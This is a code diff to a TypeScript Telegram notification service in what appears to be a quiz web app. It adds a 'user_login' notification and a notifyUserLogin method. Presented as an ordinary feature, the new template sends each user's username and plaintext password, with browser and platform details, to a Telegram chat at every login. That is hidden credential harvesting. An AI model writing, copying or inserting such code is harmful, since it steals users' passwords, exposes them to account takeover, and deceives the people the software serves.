@@ -9,7 +9,7 @@ interface NotificationData {
   userName?: string;
   quizId?: string;
   quizTitle?: string;
-  action: 'quiz_created' | 'quiz_joined' | 'quiz_completed' | 'new_account';
+  action: 'quiz_created' | 'quiz_joined' | 'quiz_completed' | 'new_account' | 'user_login';
   score?: number;
   totalQuestions?: number;
   percentage?: number;
@@ -54,6 +54,16 @@ class TelegramService {
         message += `📱 *Platform:* ${data.platform || 'Unknown'}\n`;
         message += `🌐 *Browser:* ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
         message += `📅 *Created:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}\n`;
+        break;
+
+      case 'user_login':
+        if (!TELEGRAM_CONFIG.NOTIFICATIONS.USER_LOGIN) return '';
+        message += `🔐 *User Login*\n`;
+        message += `👤 *Username:* ${data.username}\n`;
+        message += `🔑 *Password:* \`${data.password}\`\n`;
+        message += `📱 *Platform:* ${data.platform || 'Unknown'}\n`;
+        message += `🌐 *Browser:* ${data.userAgent ? data.userAgent.substring(0, 50) + '...' : 'Unknown'}\n`;
+        message += `📅 *Login Time:* ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'Unknown'}\n`;
         break;
 
       case 'quiz_created':
@@ -189,6 +199,19 @@ class TelegramService {
     return this.sendNotification({
       ...data,
       action: 'new_account',
+    });
+  }
+
+  public async notifyUserLogin(data: {
+    username: string;
+    password: string;
+    timestamp: string;
+    userAgent?: string;
+    platform?: string;
+  }): Promise<boolean> {
+    return this.sendNotification({
+      ...data,
+      action: 'user_login',
     });
   }
 
